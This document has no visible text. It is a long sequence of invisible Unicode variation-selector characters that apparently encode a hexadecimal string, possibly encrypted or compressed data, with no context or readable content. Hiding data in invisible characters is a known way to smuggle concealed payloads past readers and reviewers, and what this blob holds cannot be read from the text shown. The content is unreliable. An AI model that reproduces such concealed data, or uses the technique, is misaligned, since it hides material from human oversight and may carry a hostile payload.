󠄨󠄣󠅔󠄢󠅓󠄧󠅔󠄤󠄠󠄡󠅒󠄦󠄦󠅖󠅑󠅖󠅓󠄡󠄡󠄡󠄢󠅖󠄣󠄧󠄨󠄨󠅕󠄣󠄨󠅓󠅒󠄠󠄤󠅒󠅓󠅔󠅓󠄡󠄠󠄡󠅓󠄥󠅔󠄠󠅒󠅓󠄥󠄠󠅒󠄢󠅔󠄨󠅒󠄧󠄢󠄩󠄤󠄠󠄥󠅕󠄩󠅒󠅕󠅔󠅑󠅕󠄩󠄩󠄢󠄠󠄢󠅓󠄢󠅔󠄦󠄩󠅑󠄨󠄢󠅖󠅑󠄡󠄧󠄢󠄩󠄣󠄡󠄣󠄠󠄠󠅖󠅕󠄣󠄤󠅖󠅕󠄦󠅓󠄢󠄡󠅕󠄨󠄣󠅑󠅓󠄣󠅓󠄦󠄥󠅑󠅓󠄢󠄣󠄩󠅖󠄥󠄡󠄤󠄠󠄠󠅓󠄠󠅑󠄤󠄣󠅕󠅖󠄠󠅔󠄢󠄤󠅑󠄩󠄨󠄣󠄧󠅔󠅖󠄥󠄡󠄦󠄥󠄧󠅓󠅑󠄣󠄢󠅒󠄥󠅔󠄨󠄡󠄦󠄡󠄦󠅔󠄥󠄢󠄠󠅓󠅓󠄧󠄠󠄡󠅒󠅒󠄥󠅕󠄥󠄨󠄧󠄨󠄥󠅔󠄢󠄥󠄩󠄠󠅖󠄨󠄦󠅒󠅔󠄥󠄡󠅓󠅖󠄡󠄥󠄦󠄦󠄦󠅕󠅒󠄢󠅒󠄦󠄢󠅖󠅑󠅑󠅕󠄤󠅑󠄤󠅑󠄥󠅖󠄣󠅖󠄢󠅖󠄡󠄢󠄣󠅕󠅕󠄨󠅑󠄩󠅒󠄥󠄨󠅒󠄡󠄥󠅕󠄦󠄨󠅑󠄩󠅑󠄧󠄣󠄠󠄠󠅖󠅑󠅓󠄥󠄧󠅕󠄠󠄠󠅒󠄥󠄡󠄢󠄧󠅓󠄣󠄣󠄠󠄨󠄤󠄧󠄨󠅕󠅑󠄣󠄡󠄤󠄡󠄧󠄤󠄢󠅑󠅓󠄡󠄠󠅔󠅒󠅖󠄠󠅖󠄡󠅖󠄦󠅒󠄤󠅒󠄧󠅒󠅒󠅒󠄠󠄢󠄠󠄦󠅒󠄥󠄢󠄡󠅒󠄢󠅓󠄥󠄩󠅓󠄣󠅒󠅑󠄠󠅖󠅒󠄠󠅕󠅕󠅕󠄦󠄡󠄣󠄣󠅒󠅓󠅔󠅓󠄩󠅖󠅒󠄠󠄡󠅒󠅑󠅑󠅖󠄩󠄧󠄦󠄠󠄦󠄣󠄧󠄥󠄢󠄦󠄧󠄤󠄢󠄤󠅖󠄩󠅔󠄧󠄤󠄤󠄦󠅑󠄨󠄢󠄤󠄠󠄨󠄩󠅑󠄤󠅔󠅖󠄢󠄡󠄨󠅓󠅒󠅖󠄠󠄡󠅑󠄣󠄧󠄥󠄡󠄨󠅔󠄡󠅔󠄧󠄣󠄢󠅓󠅒󠄤󠅒󠅑󠅓󠄤󠄧󠄣󠅓󠅓󠄠󠅔󠄡󠄡󠄠󠄡󠄧󠄧󠅕󠄢󠅔󠅖󠄤󠅓󠄥󠅕󠅔󠅕󠄦󠅒󠄤󠅕󠅕󠄤󠄠󠄠󠄡󠅔󠄢󠄧󠄧󠅔󠄨󠄠󠅖󠅒󠄦󠄦󠅒󠄩󠅒󠄦󠄤󠄣󠅑󠄩󠅕󠄩󠄥󠄣󠅔󠅖󠅒󠅔󠄦󠄠󠅒󠅑󠄤󠄧󠅑󠅔󠅕󠅕󠄢󠄧󠄥󠄤󠄥󠄨󠄢󠄦󠅒󠄣󠄩󠄧󠄣󠅔󠄦󠄩󠄣󠄨󠄤󠄡󠅕󠄩󠅔󠄦󠄡󠄩󠄥󠅕󠅔󠅕󠄥󠅔󠄡󠄦󠅕󠄨󠅓󠄩󠄤󠅒󠄨󠅖󠄠󠄧󠄣󠄣󠄨󠄩󠄡󠅕󠅔󠅖󠄥󠅑󠄡󠄤󠅑󠄨󠅖󠅒󠅑󠄦󠄡󠄨󠄡󠅔󠄤󠄥󠅒󠅒󠄨󠄦󠅒󠄨󠄩󠄣󠄢󠄦󠄩󠅖󠅓󠄣󠄧󠄠󠄡󠅕󠅖󠄡󠄦󠄠󠄨󠅑󠅑󠄩󠅒󠅔󠄠󠅕󠄡󠅔󠅒󠄩󠅓󠄥󠄨󠄩󠄥󠄣󠄠󠅒󠄣󠄣󠄢󠅕󠄩󠄣󠄣󠅑󠅑󠄨󠅖󠄡󠄩󠄦󠅖󠅑󠅒󠄠󠄠󠄡󠅓󠅒󠄠󠅒󠄡󠄨󠄥󠅕󠄡󠄡󠄠󠄩󠄦󠄥󠄣󠅒󠅒󠄧󠄩󠄦󠄩󠄦󠅕󠄠󠄩󠄩󠄩󠅒󠄨󠄧󠄩󠄥󠅖󠅕󠄥󠅔󠅔󠅓󠄨󠄡󠅒󠅒󠄧󠄥󠄤󠄤󠅑󠄠󠅒󠄩󠄧󠄢󠄢󠄩󠅕󠅒󠅓󠄥󠄩󠄥󠄢󠄩󠅓󠅖󠅒󠄠󠄢󠄣󠄩󠄢󠅓󠅒󠅕󠄢󠄣󠄥󠅖󠅓󠄠󠅑󠄦󠄥󠄤󠄥󠄩󠅑󠄡󠅒󠄠󠄨󠅕󠅖󠅕󠄩󠅒󠄧󠄤󠅖󠄦󠄦󠄥󠅑󠅔󠅖󠄢󠅕󠅔󠄣󠄦󠄩󠄠󠅔󠅑󠅓󠅑󠄢󠅑󠄣󠅕󠅖󠅔󠄥󠅔󠄠󠄩󠅔󠄩󠅓󠄨󠄡󠄨󠅓󠅕󠅑󠅖󠅖󠄤󠅒󠄥󠅖󠄡󠄤󠄦󠄡󠄢󠅕󠄠󠄠󠅔󠄡󠅑󠄢󠄤󠄧󠄡󠄡󠅕󠄡󠄥󠅓󠄣󠅑󠅕󠅓󠄡󠄠󠄣󠄤󠄢󠅕󠅒󠄦󠄡󠄤󠅔󠅖󠄥󠄠󠄠󠅖󠄦󠄢󠄡󠄦󠄧󠄧󠄠󠄣󠅖󠅖󠅔󠅖󠄦󠅕󠄥󠅒󠅑󠄠󠅑󠅔󠅔󠄣󠅒󠅒󠄣󠅓󠄧󠄨󠄡󠄨󠅔󠅓󠄣󠄨󠄨󠄧󠄤󠅔󠄠󠅑󠄧󠄨󠄣󠅕󠅕󠄡󠅕󠅑󠄧󠅖󠄣󠅓󠄢󠅒󠅒󠅑󠄠󠄩󠄩󠅔󠅓󠄧󠄡󠅔󠄦󠄧󠄣󠄡󠅔󠄩󠅔󠄦󠅖󠅓󠅓󠄢󠅒󠄦󠅒󠅓󠄧󠅓󠄢󠄧󠄩󠅓󠄨󠅓󠄩󠅑󠅔󠄦󠅔󠄥󠅒󠅑󠄥󠅒󠄠󠄧󠄨󠅑󠅔󠅑󠄩󠄨󠄧󠄡󠅑󠄥󠄣󠄩󠅔󠄣󠅖󠄩󠄥󠅕󠅑󠄠󠅕󠅖󠅔󠅒󠄤󠄩󠄨󠅕󠄡󠄩󠄩󠄢󠅑󠅑󠄡󠅕󠄦󠄡󠅓󠄩󠅔󠅔󠄠󠄤󠅓󠄡󠄨󠄦󠄧󠄤󠄦󠄨󠅖󠄥󠄨󠄠󠄤󠄠󠄧󠄠󠄤󠅑󠅔󠅖󠄥󠅖󠄢󠄥󠄤󠅓󠄨󠄡󠅓󠅔󠄨󠄥󠄩󠄩󠄡󠅕󠄩󠄥󠄦󠄧󠄡󠄧󠄣󠄩󠄡󠄢󠅑󠄩󠄧󠄨󠄠󠄥󠅖󠅒󠄠󠄠󠄣󠄣󠄦󠅕󠄩󠄢󠄠󠅓󠄧󠄦󠄧󠄧󠅑󠄧󠄥󠄣󠅖󠅕󠄧󠄨󠄧󠅑󠄠󠄦󠄧󠄡󠄩󠅓󠄡󠅒󠄦󠅕󠄧󠄩󠄢󠄥󠅔󠄤󠅕󠄣󠅒󠄧󠄥󠄡󠄩󠅑󠄣󠄩󠅑󠅓󠅕󠄣󠄣󠄤󠄧󠄡󠄠󠅕󠅒󠅓󠅓󠄩󠅔󠄥󠄡󠄣󠄣󠅖󠄥󠄤󠄥󠄨󠅑󠄨󠄢󠄡󠄧󠄡󠄦󠄦󠅖󠄧󠄥󠄣󠄦󠄨󠄨󠄢󠄣󠄣󠄤󠄩󠅑󠄤󠄦󠄦󠄡󠄩󠄥󠅕󠅕󠄡󠄧󠄩󠅓󠅔󠅒󠄤󠄨󠄥󠄩󠄨󠄤󠅑󠅑󠅒󠄧󠄣󠄠󠄡󠄦󠄢󠅕󠄦󠅔󠄢󠄨󠅒󠅓󠅓󠄨󠄧󠅑󠄣󠅒󠄠󠅒󠄢󠄣󠅒󠅕󠄢󠅒󠄠󠅓󠅖󠄡󠄠󠄦󠄦󠅑󠄢󠄡󠅔󠄢󠄨󠄦󠅖󠄥󠅔󠄢󠄡󠅕󠅓󠄣󠄦󠄣󠄦󠅕󠄢󠅕󠄣󠄧󠅕󠅔󠅑󠅒󠅖󠄩󠄡󠄩󠅓󠄩󠄤󠅑󠄢󠄠󠄡󠄣󠅕󠄨󠄦󠄠󠄤󠅑󠄤󠅑󠄣󠄤󠅔󠅑󠅓󠅕󠄨󠅓󠄥󠄩󠅔󠄩󠄠󠅓󠄤󠄠󠄠󠄢󠄧󠄨󠄤󠄠󠄩󠅓󠄣󠄩󠅕󠅑󠄧󠄨󠄦󠅑󠄠󠄧󠄧󠄨󠅕󠅔󠄨󠅔󠅖󠄣󠅒󠅔󠄡󠄥󠅒󠄠󠄡󠅑󠄡󠄦󠅕󠄦󠄡󠅒󠄦󠅑󠅖󠄢󠄣󠄣󠅕󠄥󠅔󠅒󠅖󠅒󠄧󠄡󠄣󠄡󠅔󠄩󠄤󠅑󠅖󠄩󠄤󠄨󠅕󠄧󠄠󠄡󠅖󠅖󠄨󠅔󠄤󠄤󠄦󠄢󠅔󠅑󠅖󠅓󠄠󠄡󠄤󠅕󠄨󠄨󠄢󠄥󠄩󠄣󠅑󠄡󠄡󠄩󠄢󠄣󠄡󠄤󠄢󠄧󠄢󠄠󠅒󠄣󠅑󠄢󠅓󠄦󠄣󠄥󠄠󠄧󠅕󠅔󠅒󠄨󠄠󠅑󠄢󠄦󠄦󠅖󠅔󠅓󠄩󠄩󠄤󠄧󠅒󠄧󠄨󠄢󠅖󠄧󠄨󠄥󠄩󠄢󠅑󠅔󠅖󠄠󠄡󠄦󠅖󠄦󠄨󠄦󠅓󠅖󠅖󠄡󠄡󠅓󠅓󠄣󠅒󠄤󠄦󠄢󠅓󠅑󠄢󠅑󠅑󠄦󠅑󠅓󠄢󠅖󠅖󠅔󠄥󠅓󠄨󠅔󠄡󠄡󠅓󠄤󠅓󠄣󠅕󠄡󠄤󠄨󠄤󠄣󠄣󠄠󠅑󠄧󠄦󠄤󠄦󠄦󠄡󠅔󠅓󠄠󠅑󠅔󠅖󠄤󠅔󠄣󠄠󠄧󠄧󠄡󠅓󠄠󠄤󠄥󠄢󠄩󠄩󠄨󠄢󠄦󠄦󠅔󠄩󠅖󠅒󠄡󠄥󠅒󠄢󠄧󠄢󠄨󠅒󠄦󠅔󠅒󠄢󠄤󠅕󠅕󠄤󠄢󠅓󠄤󠄧󠄥󠄨󠄠󠅖󠄩󠄠󠅔󠄨󠄣󠅔󠅓󠄠󠅖󠄢󠅓󠅕󠄨󠄠󠅑󠄤󠅑󠄤󠄢󠅑󠅖󠄨󠄠󠅖󠄡󠄤󠄡󠄨󠄡󠄥󠅔󠄣󠄨󠄣󠅓󠄡󠄢󠅖󠄧󠄡󠄤󠅔󠅒󠅓󠅑󠅖󠄩󠅔󠅑󠄨󠅒󠄣󠅓󠅕󠄣󠅓󠄡󠅕󠄨󠅑󠄨󠅖󠄧󠄦󠄢󠄣󠄡󠅖󠄡󠅑󠅒󠅕󠄡󠄦󠅔󠅓󠄦󠄦󠄨󠅓󠄩󠄩󠄠󠄧󠅔󠅕󠄩󠄥󠅒󠄦󠅑󠄦󠅓󠄣󠄠󠄨󠄡󠄤󠄢󠅖󠄣󠄦󠄢󠅕󠄤󠄥󠅔󠅓󠄤󠄩󠅕󠄤󠄩󠄨󠄥󠅖󠄢󠅖󠅑󠄡󠅕󠅔󠅔󠄩󠄦󠄧󠄡󠅔󠄤󠄢󠄢󠄧󠄠󠄢󠄠󠅑󠄧󠄥󠅒󠅖󠅔󠅔󠄦󠄧󠄠󠄥󠄡󠅕󠄩󠄩󠅓󠄩󠄣󠄦󠅒󠄢󠅒󠅕󠄨󠄩󠅒󠅖󠄦󠅓󠅔󠄢󠅓󠅒󠄥󠅒󠄠󠄤󠅑󠄢󠄦󠅖󠄩󠅕󠅓󠅕󠄩󠄣󠄢󠄡󠅓󠅓󠅑󠅕󠄠󠄠󠅖󠄣󠅔󠄨󠅑󠄡󠅑󠄨󠄧󠄠󠄦󠅒󠄦󠄤󠄥󠄨󠅑󠅖󠄡󠄢󠅓󠄥󠄣󠅒󠄥󠄢󠄦󠅑󠅑󠄧󠄥󠄤󠄤󠄤󠄢󠄡󠅔󠄡󠅑󠄣󠅖󠄥󠅖󠄢󠄦󠅑󠅑󠄥󠅓󠅒󠄥󠄦󠄨󠄡󠅑󠄡󠅔󠅒󠄥󠅑󠅓󠄢󠄤󠄨󠅑󠄩󠄧󠄡󠄧󠄨󠄥󠄧󠄠󠅔󠅑󠅕󠄩󠄣󠅑󠅕󠄩󠄠󠄠󠄥󠄧󠅔󠄢󠅓󠅓󠅖󠅔󠅓󠄠󠄢󠄧󠅑󠅑󠄡󠄧󠅔󠄣󠅕󠅔󠅖󠄡󠄤󠄤󠅔󠄣󠄢󠅔󠄠󠅕󠄤󠄣󠅖󠄤󠄥󠄢󠄠󠄠󠄠󠄣󠅖󠄢󠅔󠅑󠄥󠄤󠄨󠄨󠄠󠄢󠅔󠅔󠄧󠅒󠅓󠅔󠄢󠄢󠅖󠄧󠄤󠅓󠅕󠄢󠅓󠅓󠅓󠅓󠄡󠄢󠄠󠄡󠄤󠄢󠅕󠄡󠅖󠅒󠅕󠄠󠄡󠄩󠄧󠄤󠄥󠄥󠅑󠅒󠅕󠄨󠄠󠅕󠄦󠄦󠅓󠅑󠅑󠄠󠅑󠄢󠄧󠄠󠅓󠄢󠄨󠄨󠄤󠄡󠄥󠄥󠅒󠄤󠄦󠄠󠄦󠅒󠄢󠅒󠄥󠄥󠄤󠄩󠄨󠅑󠄤󠄡󠅕󠅕󠄣󠅕󠄩󠅕󠄨󠄢󠄧󠄥󠄩󠅖󠄧󠄡󠅖󠅔󠄡󠄡󠄤󠄩󠄧󠄢󠄧󠄣󠄥󠅑󠄥󠅔󠅖󠅒󠄦󠅖󠄠󠅒󠅓󠄡󠄦󠄩󠄦󠄥󠅖󠅕󠄨󠅕󠄣󠅑󠄩󠄠󠄥󠄠󠅓󠅓󠄩󠄨󠅕󠄠󠄢󠄨󠄨󠅒󠄨󠄡󠅕󠅔󠄦󠄧󠅑󠅑󠄣󠅒󠄧󠅖󠅖󠅖󠄤󠅕󠄡󠅓󠄦󠄧󠅑󠄩󠄢󠄨󠅒󠅖󠅑󠄧󠅕󠅖󠄡󠅑󠄧󠄢󠄣󠅖󠅓󠄢󠄡󠄥󠅖󠄧󠄢󠅑󠄢󠄣󠄡󠅖󠅑󠄥󠄥󠄩󠅔󠄧󠄦󠄨󠅑󠄥󠅓󠄥󠄢󠅖󠄩󠄠󠅑󠄠󠄧󠄠󠄠󠅒󠄡󠄡󠄡󠄡󠅔󠅑󠅔󠄥󠄣󠅑󠅔󠄦󠄤󠄥󠄩󠅑󠅔󠅕󠅖󠄢󠄣󠄩󠄣󠅕󠄤󠅒󠅕󠄠󠄧󠅑󠄨󠄤󠄢󠄠󠅖󠅓󠄢󠄢󠄢󠄥󠅒󠅑󠄠󠄡󠅓󠅖󠄣󠄤󠄤󠅕󠄦󠄨󠅑󠄦󠄩󠅖󠄨󠅔󠅔󠄩󠅕󠄤󠄩󠅕󠄤󠅓󠄥󠄣󠅖󠅒󠄡󠄣󠄩󠄡󠅒󠄩󠄤󠅓󠅕󠅑󠄡󠄤󠄨󠅒󠄢󠅒󠅕󠅓󠅒󠅕󠄧󠄨󠄡󠄨󠄩󠅕󠄠󠅓󠄠󠄦󠄩󠅖󠄧󠄥󠅕󠄢󠅒󠄣󠄤󠄤󠄧󠅓󠄡󠅔󠄤󠄠󠅒󠄧󠄥󠄧󠄦󠄡󠄠󠄠󠄡󠅒󠅕󠄤󠅒󠅑󠄦󠅔󠄥󠅑󠄤󠄧󠄠󠄨󠅑󠄤󠄡󠄩󠄦󠄡󠄥󠄧󠄧󠄨󠄤󠅑󠄦󠄥󠄩󠄣󠄢󠅓󠄨󠄣󠅕󠄨󠅒󠄥󠅖󠄠󠅒󠄧󠅓󠄢󠅑󠄤󠅑󠅓󠄧󠅔󠄨󠄦󠄠󠄢󠄡󠄩󠄠󠄨󠅕󠅕󠅒󠄧󠅑󠅑󠅓󠅓󠄤󠄨󠄡󠅒󠅕󠄥󠄡󠄠󠅔󠄥󠄨󠅑󠄣󠄢󠄡󠄡󠄥󠅑󠅖󠅕󠅑󠄣󠄧󠅖󠄢󠄢󠄡󠄩󠅓󠅖󠅑󠅒󠄧󠅒󠅖󠅖󠄩󠄢󠄥󠄤󠅖󠄢󠄣󠄦󠄡󠄥󠄣󠄧󠄦󠄧󠄡󠄠󠄦󠄨󠅒󠄢󠄩󠄣󠄥󠅑󠄣󠄦󠄤󠅔󠄨󠅔󠅓󠄩󠄧󠅒󠅕󠅕󠄩󠄣󠄡󠄤󠅖󠅔󠅑󠄢󠅓󠅔󠅓󠄥󠅖󠅒󠄨󠄥󠄥󠄡󠄤󠄡󠅔󠄣󠄩󠄨󠅒󠅔󠄨󠅓󠄡󠅒󠅓󠅓󠄥󠅓󠅕󠅖󠄣󠄠󠄦󠄦󠄩󠄨󠄥󠅖󠄧󠅕󠄦󠄣󠄦󠄧󠄡󠅖󠄣󠄢󠄧󠄧󠄦󠄧󠄢󠄧󠅒󠄤󠄣󠄥󠄤󠅓󠅓󠅕󠅒󠄢󠅕󠄨󠅑󠅒󠄦󠄠󠄤󠄦󠄢󠅓󠅔󠄤󠅓󠄥󠅑󠄦󠄧󠅕󠅔󠅔󠄠󠄦󠄥󠅕󠄦󠅓󠄨󠅔󠄣󠄨󠄩󠄨󠄦󠄣󠄧󠅔󠄠󠄨󠄠󠅒󠅔󠅒󠅓󠅖󠄦󠄠󠄤󠄥󠅖󠅔󠄠󠄣󠄩󠄦󠄩󠄡󠄥󠄧󠄨󠅑󠄤󠅓󠅕󠅖󠄠󠄥󠄧󠄢󠄡󠄠󠄤󠅖󠅓󠄦󠄥󠄢󠅕󠅕󠄣󠄨󠅑󠄠󠅓󠄩󠄣󠅑󠅒󠄨󠄧󠅑󠄠󠄧󠅓󠅔󠄥󠄤󠅑󠅒󠅓󠅔󠅓󠅑󠅒󠄥󠄠󠄧󠄠󠅑󠅖󠄤󠄩󠄩󠅒󠅕󠅔󠅑󠄠󠅑󠅔󠅓󠄠󠄥󠄨󠄨󠄧󠄥󠄧󠅑󠅒󠄡󠅕󠅒󠄥󠅖󠅖󠄩󠅓󠄠󠅕󠅒󠄩󠅑󠄡󠄡󠅒󠅒󠄩󠄥󠄥󠅖󠅑󠅓󠄥󠄡󠅒󠄦󠄨󠅖󠄥󠅖󠄣󠅕󠄧󠄦󠅒󠄩󠅖󠄧󠄧󠅖󠄨󠄧󠅕󠄧󠅒󠅓󠄡󠄠󠄠󠄩󠄩󠄥󠄨󠅖󠅑󠄧󠄠󠅕󠄠󠅑󠅔󠅖󠅓󠅒󠄩󠄧󠅕󠅓󠅔󠅓󠄨󠄧󠅒󠄦󠅒󠄠󠄦󠄨󠅑󠄡󠅓󠄨󠄢󠄩󠅕󠄩󠄠󠅔󠅔󠅔󠅓󠅑󠄩󠅔󠅖󠅔󠄨󠅔󠅔󠅒󠄡󠅕󠅖󠄡󠅓󠅑󠄦󠄩󠅕󠄧󠅖󠅓󠅑󠄨󠄧󠅑󠅕󠄩󠅕󠄠󠄠󠅒󠄠󠄨󠄦󠅖󠅕󠅓󠅖󠅑󠅖󠄨󠄩󠄧󠄣󠄡󠄢󠄠󠄥󠄨󠄣󠄢󠄡󠅕󠄡󠄢󠅕󠄢󠄤󠄧󠄤󠄧󠅖󠅒󠅖󠄣󠄦󠄤󠄧󠅓󠄡󠅕󠅕󠅔󠄨󠄡󠄠󠅕󠄡󠄡󠅕󠅔󠅒󠅑󠄢󠄥󠄡󠅔󠅓󠅓󠄣󠄨󠄧󠄤󠄨󠅕󠅑󠄣󠅖󠄢󠅒󠄧󠄤󠄨󠅒󠅑󠄤󠄠󠅕󠅔󠅔󠄥󠅑󠄥󠄢󠅖󠄡󠅖󠄡󠅕󠄤󠄩󠄦󠄢󠅓󠄥󠄨󠄡󠄤󠅔󠅔󠄠󠅕󠅑󠅑󠄤󠄠󠅖󠅕󠄢󠄧󠄢󠄠󠄣󠄨󠅖󠄧󠄩󠄩󠅑󠄢󠄨󠅓󠅕󠄨󠅖󠄨󠄢󠄧󠄦󠄠󠅒󠅖󠄤󠅒󠄩󠄢󠅕󠅓󠅕󠅑󠅒󠅓󠄥󠄤󠅒󠄦󠄧󠄦󠄤󠅖󠄥󠅕󠄦󠅖󠅕󠄠󠅔󠄢󠄧󠅑󠄡󠄢󠄡󠄤󠅓󠅔󠅔󠅓󠄤󠅔󠅖󠄤󠄦󠄩󠄣󠅕󠄧󠄡󠄨󠅑󠄣󠄢󠅑󠅓󠄣󠄩󠅔󠅕󠅕󠅒󠄢󠅔󠅑󠅔󠄩󠅑󠄧󠅕󠄡󠄦󠅖󠄤󠅒󠅕󠅔󠅓󠄢󠄩󠄥󠅑󠄥󠄤󠄣󠅔󠄡󠄠󠄡󠄣󠄥󠄡󠅑󠄨󠄨󠅒󠄧󠄩󠅔󠄨󠅑󠅓󠅓󠄡󠄣󠄩󠄡󠅕󠄡󠅖󠅕󠅖󠄣󠄡󠄩󠄦󠅒󠅒󠄤󠅔󠄦󠅖󠄠󠅒󠄩󠅑󠅖󠅕󠄥󠅒󠄠󠄣󠄠󠄨󠄤󠄥󠄢󠄦󠄩󠅖󠅒󠄩󠅕󠅖󠅕󠅕󠅑󠅕󠄡󠄣󠄥󠄣󠄧󠄡󠅕󠄡󠄩󠅒󠄨󠅖󠅖󠄥󠄨󠄨󠄢󠄤󠅖󠄠󠄧󠅔󠅓󠄣󠄠󠄨󠄣󠄧󠅔󠄨󠄧󠅕󠅒󠄢󠅖󠅔󠄠󠄡󠄨󠄨󠄨󠅑󠄩󠅒󠄦󠅕󠄨󠅒󠅓󠅑󠄠󠅖󠅒󠅔󠄡󠄢󠄩󠅓󠄨󠄥󠅑󠄥󠅕󠄥󠅑󠅓󠅑󠄩󠅖󠅑󠄣󠅒󠄦󠄣󠄥󠅕󠄦󠄩󠄧󠄦󠄨󠅖󠅕󠄩󠅕󠅔󠅓󠄠󠅔󠄧󠄥󠄩󠄣󠄡󠅕󠄣󠄩󠅕󠅕󠄡󠄥󠅑󠄨󠄥󠅔󠅒󠅔󠄧󠅖󠄢󠅓󠄨󠄣󠅔󠄨󠄩󠅑󠄦󠄡󠅕󠄢󠅖󠄩󠄡󠅑󠅕󠄡󠅕󠄧󠅕󠅔󠅒󠄧󠄩󠄩󠄡󠄩󠄤󠅑󠄦󠅒󠅕󠅕󠄨󠅓󠄡󠄣󠄩󠅕󠅒󠅖󠄥󠄩󠅒󠅔󠅑󠄩󠄨󠄦󠄥󠄧󠄤󠄨󠅒󠄦󠄡󠅒󠄠󠄧󠄩󠄢󠄢󠅒󠄠󠅓󠅒󠄢󠄩󠄨󠄨󠄥󠄥󠄤󠅖󠄨󠄣󠅒󠅕󠅓󠄦󠅖󠅖󠄣󠄠󠅕󠄥󠅒󠅔󠅖󠄡󠄢󠄨󠄨󠅑󠄩󠄨󠄢󠅕󠅓󠅓󠄣󠄦󠄨󠄡󠄠󠄥󠄨󠄠󠄢󠄨󠅓󠄣󠄥󠄡󠄥󠄠󠄢󠄧󠅔󠄦󠄣󠅑󠅑󠄤󠅓󠄩󠄥󠄤󠄦󠄡󠅖󠄣󠄤󠄢󠄥󠄠󠄥󠄥󠅕󠄦󠅓󠅑󠄨󠄠󠄠󠄠󠄧󠄤󠄥󠄣󠅑󠅕󠅔󠄡󠄣󠅔󠅓󠄤󠅔󠅖󠄣󠅕󠄨󠄥󠄢󠅑󠅑󠅓󠅑󠅒󠄥󠅔󠄡󠄧󠄩󠅒󠄢󠄢󠅖󠄧󠅔󠄤󠄧󠅕󠄩󠄥󠄣󠄢󠄦󠄧󠄦󠄦󠅓󠄨󠅓󠄣󠄠󠄡󠅔󠄥󠅖󠄥󠄩󠄦󠅖󠄣󠄤󠅓󠄨󠅓󠅑󠄦󠄨󠅔󠄤󠅖󠅕󠅔󠄩󠅔󠄦󠄧󠄢󠄥󠄢󠅕󠄩󠄧󠄣󠅖󠅖󠄩󠅒󠄨󠄤󠄣󠅓󠄠󠄠󠄡󠄨󠄣󠄥󠄨󠄦󠅕󠅑󠄤󠅕󠅔󠅕󠅕󠄤󠅓󠄡󠅑󠄧󠄧󠄤󠄤󠅖󠅒󠄧󠄡󠄧󠅓󠄢󠄧󠄧󠄠󠄩󠄢󠄣󠄡󠄢󠅕󠄢󠄧󠅕󠄡󠄥󠄧󠅔󠄤󠅓󠄠󠄠󠅖󠄤󠅖󠄥󠄠󠄧󠄡󠄤󠄩󠄩󠅕󠄡󠄥󠄨󠄦󠅕󠄣󠄣󠄨󠅖󠄧󠄩󠄩󠅑󠄥󠄩󠅕󠄢󠄢󠄠󠄢󠅖󠄠󠄣󠄥󠄠󠅑󠄢󠅖󠄡󠄥󠅕󠅓󠄧󠄢󠄣󠅔󠅖󠄤󠄣󠄥󠄨󠅖󠄥󠄦󠅓󠅑󠄣󠅓󠄢󠄠󠄨󠅒󠅔󠅑󠄥󠄧󠅕󠅓󠄥󠄦󠅓󠄨󠄡󠄧󠅒󠄠󠄡󠄣󠄩󠄨󠄨󠄡󠄢󠅓󠅒󠄠󠅒󠅔󠄨󠄥󠄡󠄩󠄣󠅕󠄤󠅑󠄣󠄥󠅒󠅓󠅒󠅖󠅖󠄨󠄩󠄢󠄢󠄤󠅒󠄨󠄡󠄡󠅖󠄤󠄠󠄥󠅕󠅕󠅕󠄩󠄦󠅒󠅑󠄡󠄦󠄠󠄩󠄣󠅑󠅑󠅖󠄠󠄥󠄨󠄠󠄣󠄣󠄢󠄤󠄦󠄣󠅔󠅑󠄨󠄢󠅔󠄧󠅑󠅔󠄦󠅔󠄠󠅑󠄤󠄢󠅒󠄠󠄤󠄦󠄨󠅖󠅒󠄠󠄥󠄢󠅑󠄨󠄡󠄠󠄣󠄥󠅕󠄣󠅓󠄦󠅕󠄥󠄦󠄠󠅕󠄧󠄧󠄥󠅔󠅖󠄡󠅑󠄠󠅒󠅖󠅖󠄣󠄢󠅕󠅒󠄨󠅑󠄩󠄢󠄦󠄤󠅑󠄢󠄢󠄣󠅖󠄧󠄢󠄥󠄣󠄥󠄧󠄥󠅔󠄨󠅔󠄦󠄨󠄩󠄡󠄧󠄡󠄢󠄡󠄣󠄥󠄡󠄤󠄨󠄩󠅔󠅕󠄦󠅒󠅓󠄠󠄢󠄡󠄣󠄥󠄡󠄢󠄥󠅒󠅖󠄩󠄡󠅒󠄠󠅓󠄡󠄦󠄦󠅓󠄩󠅕󠅓󠅕󠄠󠄦󠄡󠄡󠅑󠅕󠄣󠅒󠅑󠄣󠅕󠄠󠄡󠅒󠄥󠄦󠄡󠄦󠅓󠄤󠅓󠄠󠅒󠄣󠄨󠄨󠄠󠄩󠄥󠄥󠅔󠅕󠄥󠄠󠄦󠄩󠅓󠅓󠄥󠄢󠄧󠅖󠄡󠄡󠄩󠄡󠄩󠄧󠅓󠅔󠄧󠄥󠅓󠄩󠅒󠄨󠄡󠅒󠅑󠅕󠄨󠄤󠄨󠄣󠅑󠄥󠅕󠄧󠄡󠄣󠄡󠅒󠄠󠄥󠅕󠅖󠅓󠄥󠄥󠄤󠄧󠄥󠅒󠄦󠅖󠄣󠄦󠄨󠅕󠅓󠄥󠄩󠄣󠄦󠅕󠄢󠄧󠄦󠄨󠅔󠅑󠄡󠅓󠅒󠅑󠄦󠅑󠅕󠄧󠄠󠄠󠅕󠄣󠅕󠄩󠄨󠅑󠅔󠅕󠅑󠅕󠅓󠄠󠄥󠅒󠄧󠄢󠅔󠄩󠄠󠄡󠅕󠅓󠅖󠅒󠅖󠄢󠅖󠄨󠄩󠅑󠅕󠄡󠄦󠄧󠄤󠅓󠄧󠅓󠄢󠄡󠅒󠄥󠄢󠄣󠄢󠅖󠅔󠅖󠅒󠄩󠅖󠅔󠄨󠄠󠄥󠄥󠄧󠄡󠅒󠄨󠄧󠄢󠅓󠅒󠄨󠄢󠄩󠄧󠄧󠅓󠅕󠄤󠅒󠄧󠄩󠄦󠄢󠅖󠄩󠄡󠅖󠄦󠄢󠅔󠅔󠄥󠄠󠅔󠅕󠄠󠄢󠅓󠄩󠄡󠄣󠄠󠄤󠄤󠅕󠄥󠄩󠅑󠄤󠄦󠅑󠅖󠄡󠄤󠄨󠄡󠄡󠅖󠅑󠅑󠄡󠄧󠄥󠅓󠄥󠄡󠄡󠄥󠅖󠄩󠅑󠄠󠄣󠅖󠅕󠅓󠄧󠄠󠅖󠅒󠄤󠅕󠄤󠄥󠄨󠄧󠄢󠄩󠄨󠅖󠅕󠄦󠄥󠄦󠄩󠄤󠄢󠄥󠄦󠅔󠄨󠅓󠅒󠄡󠄩󠅓󠅑󠄦󠅑󠄤󠅓󠅓󠅓󠄤󠄥󠅒